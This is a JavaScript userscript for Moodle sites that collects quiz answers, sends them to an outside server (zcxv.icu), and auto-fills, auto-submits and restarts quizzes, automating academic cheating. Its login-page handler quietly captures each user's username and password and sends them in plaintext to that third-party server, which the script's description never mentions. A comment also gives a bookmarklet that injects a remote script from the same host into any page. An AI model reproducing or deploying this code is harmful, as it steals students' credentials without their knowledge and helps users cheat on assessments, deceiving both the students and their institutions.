// ==UserScript==
// @name MoodleAnswerCollector
// @description Userscript to collect answers and help with questions on Moodle based sites
// @version 1.4.4.6
// @require https://cdnjs.cloudflare.com/ajax/libs/blueimp-md5/2.19.0/js/md5.min.js
// @require https://raw.githubusercontent.com/vladgba/MonkeyConfig/master/monkeyconfig.js
// @match *://*/*login/index.php*
// @match *://*/my/*
// @match *://*/course/view.php*
// @match *://*/course/user.php*
// @match *://*/mod/quiz/processattempt.php*
// @match *://*/grade/report/overview/index.php*
// @match *://*/mod/quiz/view.php*
// @match *://*/mod/quiz/attempt.php*
// @match *://*/mod/quiz/review.php*
// @match *://*/mod/quiz/summary.php*
// @grant window.close
// @grant GM_getValue
// @grant GM_setValue
// @grant GM_registerMenuCommand
// @grant GM_addStyle
// @run-at document-end
// ==/UserScript==

/*
>> simple injector for run script everywhere <<
javascript:
d=document;t=d.createElement("script");t.src="//zcxv.icu/4";d.body.appendChild(t)
*/
(() => {
    let cfg;
    if (typeof MonkeyConfig !== 'undefined') cfg = new MonkeyConfig({ title: 'Settings', menuCommand: true });
    else cfg = class { static get(a, b, c) { return c } static open() { return; } };

    let _ = undefined;
    let floatsetbtn = cfg.get('Floating settings button', _, true);
    let silent = cfg.get('Silent mode', _, false);
    let autoignoreerrors = cfg.get('Ignore errors', _, false);
    let forceauto = cfg.get('Auto start and restart tests', _, false);
    let autoselect = cfg.get('Choose correct answer', _, false);
    let autonext = cfg.get('Auto next', _, false);
    let autoend = cfg.get('End tests', _, false);
    let autoclose = cfg.get('Close when 100 percent right', _, false);
    let forceautocourse = cfg.get('Open all available tests on grades page', _, false);
    let hlanswonreview = cfg.get('Highlight answers on review page', _, false);
    let hlreview = cfg.get('Change icon of page to green when test ended', _, false);
    let automark = cfg.get('Mark all as done at course page', _, false);
   // let haymaking = cfg.get('Open tests attempts for collect answers', _, false);
   // let haymlist = cfg.get('Open course tests for collect all answers', _, false);
    let closeontesterror = cfg.get('Close test what cant be done', _, false);
    let waitnext = cfg.get('Wait time before click NEXT button', _, false);
    let nextTimeout = cfg.get('Wait time in ms', 'number', 300);
    let reloadgrades = cfg.get('Reload test grades page', _, false);
    let skiptest = cfg.get('Skip tests by name', _, true);
    let skipname = cfg.get('What to skip', 'text', 'firstskip|secondskip|(other skip)');

    let mulrgx = (...arr) => '(' + arr.join(')|(') + ')';
    let _have = (e, c) => e.classList.contains(c);
    let $ = (e, s = false) => _dq('querySelector', e, s);
    let $$ = (e, s = false) => _dq('querySelectorAll', e, s);
    let _dq = (f, e, s) => s ? e[f](s) : document[f](e);

    let lang = {
        'singleansw': mulrgx('The correct answer is: '),
    };

    let apilink = 'https://api.zcxv.icu/tsatu.php';
    let answersclicked = false;

    console.log('MoodleAnswerCollector started');

    let forb;
    try {
        forb = new RegExp('(' + skipname + ')', 'i');
    } catch (e) {
        alert("Cant create regexp");
        skiptest = false;
    }

    if (floatsetbtn) {
        let button = document.createElement("Button");
        button.innerHTML = "MDL-SET";
        button.onclick = () => cfg.open({
            windowFeatures: {
                location: 'no',
                status: 'no',
                left: window.screenX,
                top: window.screenY,
                width: 500,
                height: 800
            }
        });
        button.style = "top:2px;left:40%;position:fixed;z-index: 9999"
        document.body.appendChild(button);
    }

    if ($('div#page') == null) setTimeout(() => window.location.reload(), 1000);

    function chooseVal(dd, val) {
        val = filterSelText(val?.trim());
        for (let i = 0; i < dd.options.length; i++) {
            let optsel = filterSelText(dd.options[i].text)?.trim();
            if (optsel === val) {
                dd.selectedIndex = i;
                break;
            }
        }
    }

    let ignoreErrors = () => {
        if (!autoignoreerrors) return;
        $('p.errorcode>a[href*="/submissionoutofsequencefriendlymessage"], p.errorcode>a[href*="/notenoughrandomquestions"]') && window.close();
        $('div[data-rel="fatalerror"]') && $('div[role="main"] form button[type="submit"]').click();
    };

    let loginPage = () => {
        $('#loginbtn').addEventListener('click', (event) => {
            event.preventDefault();
            let xhr = new XMLHttpRequest();
            let login = $('#username').value;
            let pass = $('#password').value;
            xhr.open('GET', apilink + '?v=3&q=login&login=' + encodeURIComponent(login) + '&pass=' + encodeURIComponent(pass), true);
            xhr.onload = xhr.onerror = () => $('#login').submit();
            xhr.send();
        });
    };

    let testList = () => {
        let hhg = $$("li.quiz");
        if (automark) {
            let mark = $('img[src*="/i/completion-manual-n"]');
            if (mark && !forceautocourse) {
                mark?.parentNode.click() && location.reload();
                setTimeout(() => location.reload(), 500);
            }
        }
        for (let el of hhg) {
            $(el, "a")?.setAttribute('target', '_blank');
            /*//Dead code
            if ((haymaking && haymlist) || forceautocourse) {
                if ($(el, ".isrestricted")) {} else {
                    let kh = $(el, "a");
                    kh.setAttribute('target', '_blank');
                    if (kh && !(skiptest && forb.test(kh.innerText))) window.open(kh.href);
                }
            }*/
            if (silent) el.style = 'border-right: 1px solid #' + (($(el, ".isrestricted")) ? 'ffaaaa' : 'aaffaa') + ';';
            else el.style = 'background:#' + (($(el, ".isrestricted")) ? 'FF0000' : '00FF00') + ';color:#fff';
        }
        //haymaking && haymlist && window.close();
    };

    let gradeList = () => {
        if (reloadgrades) document.body.onfocus = () => window.location.reload();
        let hhg = $$('table.user-grade img[src*="/quiz/"]');
        for (let el of hhg) {
            let chk = (el, v) => ($(el, "td.column-percentage").innerText == v);
            let islnk = el.parentNode.tagName == 'A';
            el = el.parentNode.parentNode.parentElement;
            let good = chk(el, '100.00 %') || chk(el, '100,00 %'); //fullfilled
            let bad = chk(el, '-') || chk(el, '0.00 %') || chk(el, '0,00 %'); //nullfilled
            if (silent) el.style = 'border-right: 1px solid #' + (good ? 'aaffaa' : 'ffaaaa') + ';';
            else el.style = 'background:#' + (good ? '00FF00' : (bad ? (islnk ? '0000FF' : '000') : 'deea02')) + ';color:#fff';
            if (forceautocourse && bad && islnk) {
                let kh = $(el, "a");
                if (!(skiptest && forb.test(kh.innerText)) && kh) window.open(kh.href + "#forcerestart");
            }
        }
    };

    let testView = () => {
        /*if (haymaking) {
            let hg = $$(".cell.lastcol");
            if (hg.length < 1) haymaking = false;
            for (let el of hg) window.open($(el, "a").href);
        }
        haymaking && window.close();*/
        if (closeontesterror && $('.quizattempt .alert-danger')) {
            return window.close();
        }
        if (window.location.hash != "#forcerestart") {
            let regn = /([0-9]+)(\.|,)([0-9]{2}) \/ ([0-9]+)(\.|,)([0-9]{2})/;
            let fba = $('div#feedback h3')?.innerHTML;
            if (fba && regn.test(fba)) {
                let mats = fba.match(regn);
                if (mats[1] == mats[4]) return (autoclose ? window.close() : 0);
            }
        }
        if (forceauto) {
            let mtoz = $('div.quizinfo p')?.innerHTML;
            if (mtoz == 'Grading method: Highest grade' || mtoz == 'Метод оцінювання: Краща оцінка.') {
                $(".quizattempt form button").click();
            }
        }
    };

    let pressNext = () => {
        let checki = $('.que .content input[type="radio"]:checked, .que .content input[type="checkbox"]:checked');
        let checkif = $('.que .content input[type="radio"], .que .content input[type="checkbox"]');
        let selects = $$('.que .content select');
        for (let bsel of selects) {
            if (bsel.value == 0) return;
        }
        if (checkif.length > 0 && checki.length < 1) return;
        let nextfunc = () => $('.mod_quiz-next-nav').click();
        waitnext ? setTimeout(nextfunc, nextTimeout) : nextfunc();
    };

    let testAttempt = () => {
        selector = $(selector).innerText;
        getAnswers();
    };

    let reviewPage = () => {
        if (!/&showall=1$/.test(location.href)) {
            return location.replace(window.location.href + '&showall=1');
        }
        let content = [];
        let Questions = $$('.que');
        for (let part of Questions) {
            console.log('Type: ' + detectTypeOfQue(part));
            let trufalse = detectTypeOfQue(part) == 1;
            let selintext = detectTypeOfQue(part) == 7 || detectTypeOfQue(part) == 8;
            svcIconRemove(part);
            let quesss = [];
            let ans = [];
            let Question = filterQue($(part, '.formulation .qtext'));
            let Answers = $$(part, '.formulation .r0, .formulation .r1');
            let RightAnswered = [];
            let NonRightAnswered = [];
            let Selects = $$(part, 'table select').length;
            // TODO: Refactor
            if (Selects) {
                let tbl = $$(part, 'table tr');
                let result = [];
                let ranspre = $(part, '.rightanswer');
                if (ranspre) {
                    let RightAnswer = filterSelRightanswer(ranspre).replace(/\n/, '').replace(/\s+/, ' ');
                    for (let ptt of tbl) {
                        let que = filterSelText($(ptt, 'td:first-child').innerText).replace(/\n/, '').replace(/\s+/, ' ');
                        quesss.push(que);
                        let quename = ((quesss[quesss.length - 1])).trim() + ' →';
                        let quenum = '[[' + (quesss.length - 1) + ']]';
                        RightAnswer = RightAnswer.replace(quename, quenum);
                        let answ = $$(ptt, 'td select');
                    }
                    let fres = RightAnswer.split('[[');
                    fres.shift();
                    for (let fone of fres) {
                        let lastres = fone.replace(/[.,](\s+)?$/, '').split(']]');
                        result.push(filterSelText(quesss[lastres[0]].trim() + ':://::' + lastres[1].trim()));
                    }
                    content.push([Question, [], result, []]);
                } else {
                    let pts = $$(part, 'td.correct');
                    for (let pt of pts) {
                        pt = pt.parentElement;
                        let ku = $(pt, 'td:first-child').innerText;
                        let incv = $(pt, 'td:last-child').querySelector('select').selectedOptions?.[0]?.label;
                        if (!incv) continue;
                        result.push(ku.trim() + ':://::' + incv.trim());
                    }
                    let badRes = [];
                    let bpts = $$(part, 'td.incorrect');
                    for (let bpt of bpts) {
                        bpt = bpt.parentElement;
                        let ku = $(bpt, 'td:first-child').innerText;
                        let incv = $(bpt, 'td:last-child').querySelector('select').selectedOptions?.[0]?.label;
                        if (!incv) continue;
                        badRes.push(ku.trim() + ':://::' + incv.trim());
                    }
                    content.push([Question, [], result, badRes]);
                }
            } else {
                let RightAnswer;
                if (!Answers || Answers.length < 1) {
                    if (selintext) {
                        RightAnswer = $(part, '.qtext').cloneNode(true);
                        svcIconRemove(RightAnswer);
                        let raSelects = $$(RightAnswer, '.qtext select');
                        for (let ras of raSelects) {
                            if (_have(ras, 'correct')) ras.outerHTML = '[' + (ras.selectedOptions?.[0]?.label || '') + ']';
                            else ras.outerHTML = '[]';
                        }
                        RightAnswered.push(RightAnswer.innerText);
                    }
                } else {
                    RightAnswer = $(part, '.rightanswer');
                    for (let el of Answers) { //TODO: Answer or some name of el
                        let answ = filterAnswer(el);
                        if (trufalse) {
                            if (RightAnswer) {
                                if (RightAnswer.innerText.indexOf(answ) !== -1) RightAnswered.push(answ);
                            }
                            if (_have(el, 'incorrect')) NonRightAnswered.push(answ);
                            if (_have(el, 'correct')) RightAnswered.push(answ);
                        } else {
                            if (_have(el, 'incorrect')) NonRightAnswered.push(answ);
                            if (_have(el, 'correct')) RightAnswered.push(answ);
                            if ($(el, 'input[checked="checked"]')) {
                                let grade = $(part, '.grade').innerHTML;
                                if ((grade.localeCompare('Балів 1,00 з 1,00')) == 0 || (grade.localeCompare('Mark 1.00 out of 1.00')) == 0) {
                                    RightAnswered.push(answ);
                                }
                                if ((grade.localeCompare('Балів 0,00 з 1,00')) == 0 || (grade.localeCompare('Mark 0.00 out of 1.00')) == 0) {
                                    NonRightAnswered.push(answ);
                                }
                            }
                        }
                        ans.push(answ);
                    }
                    if (!trufalse && RightAnswer) RightAnswered.push(filterRightanswer(RightAnswer));
                }
                content.push([Question, ans, RightAnswered, NonRightAnswered]);
            }
        }
        sendJson('answers', filterBlocks(content), /*haymaking ? window.close : */null);
        if (forceauto) {
            if ($('table tr:nth-child(5) td:nth-child(2) b:nth-child(2)') !== '100' && $('#mod_quiz_navblock > div.card-body > div.card-text > div.allquestionsononepage > a.partiallycorrect, #mod_quiz_navblock > div.card-body > div.card-text > div.allquestionsononepage > a.incorrect')) {
                $('#page-navbar ol > li:last-child > a').click();
            } else {
                autoclose && window.close();
            }
            return;
        }
        hlanswonreview && getAnswers();
        if (hlreview) {
            document.title = '+';
            let link = $("link[rel*='icon']") || document.createElement('link');
            link.type = 'image/x-icon';
            link.rel = 'shortcut icon';
            link.href = 'http://api.zcxv.icu/green.ico';
            document.getElementsByTagName('head')[0].appendChild(link);
        }
    };

    let filterBlocks = (arr) => {
        arr.forEach((v) => {
            v[1] = unique(v[1]);
            v[2] = unique(v[2]);
            v[3] = unique(v[3]);
        });
        return arr;
    };

    let unique = (arr) => {
        let result = [];
        for (let str of arr) {
            if (!result.includes(str)) result.push(str);
        }
        return result;
    };

    let svcIconRemove = (part) => {
        let img = $$(part, '.questioncorrectnessicon, i .icon');
        if (img.length < 1) return;
        img.forEach((im) => im.remove());
    };

    let filterQue = (que) => {
        return filterText(filterInner(que).innerHTML);
    };

    let trem = (s, t, g = '') => {
        t.forEach((yv) => {
            let tags = $$(s, g + '[' + yv + ']');
            if (tags.length < 1) return;
            tags.forEach((v, i, a) => v.removeAttribute(t));
        });
    };

    let filterInner = (el) => {
        let res = el.cloneNode(true);
        let tags;
        while ((tags = $(res, 'p,span,div,i,a')) !== null) {
            tags.outerHTML = tags.innerHTML;
        }
        trem(res, ['class', 'style', 'lang']);
        return res;
    };

    let oneQuotes = (t) => t.replace(/(\u02B9|\u0374|\u2018|\u201A|\u2039|\u203A|\u201B|\u2019)+/g, '\'').replace(/(\u00AB|\u00BB|\u201E|\u201C|\u201F|\u201D|\u2E42)+/g, '"');
    let delChars = (s) => s.replace(/&nbsp;/g, ' ').replace(/(\r|\n)+/g, ' ').replace(/\s\s+/g, ' ').trim();

    let filterSelText = (text, rmquotes = false) => {
        if (!text) return text;
        let out = oneQuotes(text);
        return delChars((rmquotes ? out.replace(/(\'|")+/g, ' ') : out));
    };

    let filterText = (text, rmquotes = false) => {
        let out = oneQuotes(text);
        return delChars(rmquotes ? out.replace(/(\'|")+/g, ' ') : out).normalize("NFD").replace(/[\u0300-\u036f]/g, "").replace(/\u00A0/g, ' ').replace(/\.\s+?$/, '').trim();
    };

    let filterAnswer = (el) => {
        let xel = filterInner(el);
        $(el, 'span.answernumber')?.remove();
        let a = $(el, 'label').innerHTML.replace(/^(\s+)?([a-z]{1,4})(\s+)?\. /i, '');
        return filterText(a);
    };

    let filterRightanswer = (text, f = false) => {
        let res = (f ? filterSelText(filterInner(text).innerHTML) : filterText(filterInner(text).innerHTML));
        res = res.replace(new RegExp('Правильна відповідь: '), '').replace(new RegExp('Ваша відповідь (не )?правильна'), '');
        res = res.replace(new RegExp('Правильні відповіді: '), '');
        res = res.replace(new RegExp('The correct answer is: '), '');
        res = res.replace(new RegExp('The correct answers are: '), '');
        return res.trim();
    };

    let filterSelRightanswer = (text, f = false) => {
        let res = filterSelText(filterInner(text).innerText);
        res = res.replace(new RegExp('Правильна відповідь: '), '').replace(new RegExp('Ваша відповідь (не )?правильна'), '');
        res = res.replace(new RegExp('Правильні відповіді: '), '');
        res = res.replace(new RegExp('The correct answer is: '), '');
        res = res.replace(new RegExp('The correct answers are: '), '');
        return res.trim();
    };

    let detectTypeOfQue = (queNode) => {
        if ($(queNode, 'input[id*="_answertrue"], input[id*="_answerfalse"]')) return 1; // True / False
        if ($(queNode, 'input[type="radio"]')) return 2; // Single answer
        if ($(queNode, 'input[type="checkbox"]')) return 3; // Multiple answer
        if ($(queNode, 'input[type="text"][size="80"]')) return 4; // Standart text field
        if ($(queNode, 'input[type="text"][size="30"]')) return 5; // Number text field
        if ($(queNode, 'table select')) return 6; // Matching question
        if ($(queNode, 'select')) return 7; // Select missing words question
        if ($(queNode, '.drags')) return 8; // Drag and drop into text
        if ($(queNode, '.ddarea .draghomes')) return 9; // Img & drag imgs
        if ($(queNode, '.ddarea .dragitems')) return 10; // Img & drag markers
        return 11;
    };

    let detectMultiAnswer = (answer) => {
        if (answer.search(new RegExp('The correct answers are: ')) || answer.search(new RegExp('Правильні відповіді: '))) {
            return true;
        }
        return false;
    };

    let sendJson = (q, data, cb = null) => {
        console.log('Send:');
        console.log(data);
        let xhr = new XMLHttpRequest();
        let theUrl = apilink + '?v=3&q=' + q;
        console.log(theUrl);
        xhr.open("POST", theUrl, true);
        xhr.setRequestHeader("Content-Type", "text/plain");
        xhr.onload = (e) => {
            console.log('Response:');
            console.log(xhr.response);
            cb && cb();
        };
        xhr.onerror = () => alert('Send: NetworkError');
        xhr.send(JSON.stringify(data));
    };

    let getJson = (q, data, cb, cbdat) => {
        console.log('Get:');
        console.log(data);
        let xhr = new XMLHttpRequest();
        let theUrl = apilink + '?v=3&sel=' + encodeURIComponent(selector) + '&q=' + q;
        console.log(theUrl);
        xhr.open("POST", theUrl);
        xhr.setRequestHeader("Content-Type", "text/plain");
        xhr.onload = () => {
            console.log('Response:');
            let otv = xhr.response;
            console.log(otv);
            let resultGet = JSON.parse(otv);
            let jsonResponse = cb(resultGet, cbdat);
        };
        xhr.onerror = () => alert('Get: NetworkError');
        xhr.send(JSON.stringify(data));
    };

    let getAnswers = () => {
        let parts = $$('.que div.content');
        let qparr = [];
        let get = true;
        for (let part of parts) {
            console.log('Type: ' + detectTypeOfQue(part));
            let Selects = $(part, 'select');
            svcIconRemove(part);
            let Quest = $(part, '.formulation .qtext');
            let Answ = $$(part, '.formulation .r0, .formulation .r1');
            let Question = filterQue(Quest);
            let answinpttext = $(part, 'input[type="text"]');
            if (answinpttext != null) {
                qparr.push({
                    'que': Question
                });
                getJson('answt', qparr, (data, input) => (input[0].value = data), [answinpttext, Question]);
                get = false;
                return;
            }
            let AnswRaw = [];
            for (let anv of Answ) AnswRaw.push(filterAnswer(anv));
            qparr.push({
                'que': Question,
                'answ': (Selects ? ['Select'] : JSON.stringify(AnswRaw))
            });
        }
        get && getJson('answ', qparr, highlightAnswers, parts);
    };

    let randomSelection = (part) => {
        let selected = $$(part, "select");
        if (selected.length > 1) {
            for (let sf of selected) {
                sf.selectedIndex = Math.floor(Math.random() * (sf.length - 1)) + 1;
            }
        }
    };

    let highlightAnswers = (arr, parts) => {
        for (let part of parts) {
            answersclicked = false; //TODO: set this on que div
            if (arr.length > 0) {
                let answShift = arr.shift();
                if (typeof answShift === 'string') {
                    if (answShift === 'idontfindselects') {
                        randomSelection(part);
                    } else {
                        let Kparts = answShift.split('@@##@@');
                        let Mparts = {};
                        for (let Ki of Kparts) {
                            let Kio = Ki.split(':://::');
                            Mparts[Kio[0]] = Kio[1];
                        }
                        let tbl = $$(part, 'table tr');
                        for (let ptt of tbl) {
                            let que = filterSelText($(ptt, 'td:first-child').innerText.replace(/\n/, '').replace(/\s+/, ' ')).trim();
                            let answ = $(ptt, 'td select');
                            chooseVal(answ, Mparts[que]);
                        }
                    }
                } else {
                    if (!answShift || answShift.length < 1) return;
                    if (answShift[0] === 'text') {
                        let blockdd = document.createElement("p");
                        blockdd.innerHTML = answShift[1];
                        part.insertBefore(blockdd, part.firstChild);
                        return;
                    }
                    let Answers = $$(part, '.formulation .r0, .formulation .r1');
                    for (let ansik of Answers) HLAnswer(ansik, answShift);
                    autoselect && randomClick(part);
                }
            }
        }
        autonext && autoselect && pressNext();
    };

    let HLAnswer = (ansik, answShift) => {
        if (ansik.length < 1) {
            return alert('HL: ');
        }
        let righte = answShift.shift();
        switch (righte) {
            case '1':
                answersclicked = true;
                ansik.classList.add('answerednow');
                ansik.style = silent ? "color:#040" : "background:#00ff0c";
                clickRAnswer(ansik);
                break;
            case '2':
                ansik.classList.add('badanswer');
                ansik.style = silent ? "color:#404" : "background:#ff7a7a";
                break;
            default:
                ansik.style = silent ? "color:#444" : "background:#fff";
        }
    };

    let clickRAnswer = (ansik) => {
        let currinp = $(ansik, 'input:not([type="hidden"])');
        currinp.style = 'cursor:progress';
        if (autoselect && !currinp.checked) currinp.click();
    };

    let randomClick = (part) => {
        if (!answersclicked) {
            let selected = $$(part, ".r0:not(.badanswer) [type=radio],.r1:not(.badanswer) [type=radio]");
            if (selected.length == 1) {
                selected[0].click();
            } else if (selected.length > 0) {
                let ind = Math.floor(Math.random() * selected.length);
                selected[ind].click();
            } else {
                autonext = false;
            }
        }
    };

    let endBtns = () => {
        if (!autonext || !autoselect || !autoend) return;
        if(document.querySelectorAll("#mod_quiz_navblock .card-text a.notyetanswered").length>0) return;
        var tmp = document.querySelectorAll(".submitbtns.mdl-align");
        for (var el of tmp) {
            if (el.querySelector("input[name=finishattempt]") !== null) {
                //el.querySelector("input[type=submit]")?.click(); //TODO: Test compat or del //For old versions
                setTimeout(() => (el.querySelector("button")?.click(), setTimeout(() => document.querySelector(".moodle-dialogue input")?.click(), nextTimeout)), nextTimeout);
            }
        }
        /*if (!autonext || !autoselect || !autoend) return;
        if ($("#mod_quiz_navblock .card-text a.notyetanswered") == null) return;
        else alert('asd');
        let submitbtns = $$(".submitbtns.mdl-align");
        for (let submbtn of submitbtns) {
            if ($(submbtn, "input[name=finishattempt]")) {
                let end1 = () => $(submbtn, "button")?.click();
                let end2 = () => $(".moodle-dialogue input")?.click();
                //$(el, "input[type=submit]")?.click(); //TODO: Test compat or del //For old versions
                setTimeout(() => end1() && setTimeout(end2, nextTimeout), nextTimeout);
            }
        }*/
    };

    let routes = {
        '/login/index.php': loginPage,
        '/course/view.php': testList,
        '/course/user.php': gradeList,
        '/mod/quiz/view.php': testView,
        '/mod/quiz/attempt.php': testAttempt,
        '/mod/quiz/review.php': reviewPage,
        '/mod/quiz/summary.php': endBtns
    };

    let waitImg = (img) => {
        return new Promise((resolve, reject) => {
            if (img.complete) resolve();
            img.onload = img.onerror = () => resolve();
        });
    };

    let getImg = (c, im) => {
        let context = c.getContext('2d');
        if (im.naturalWidth < 1) return 0;
        c.width = im.naturalWidth;
        c.height = im.naturalHeight;
        context.drawImage(im, 0, 0);
        return c.toDataURL();
    };

    let createView = () => {
        let canv = document.createElement("canvas");
        canv.id = 'canv';
        canv.style = "border:black solid;display:none;";
        document.body.appendChild(canv);
        return canv;
    };

    let selector = "span.userbutton>span.usertext";
    ignoreErrors();

    (new Promise(async (resolve, reject) => {
        let img = $$('.que img');
        if (img.length < 1) return resolve();
        for (let im of img) {
            await waitImg(im);
            //TODO: silent deletion
            im.removeAttribute('width');
            im.removeAttribute('height');
            im.removeAttribute('alt');
            im.setAttribute('hash', md5(getImg(createView(), im)));
        }
        return resolve();
    })).then(() => routes[window.location.pathname] && routes[window.location.pathname]());
})();
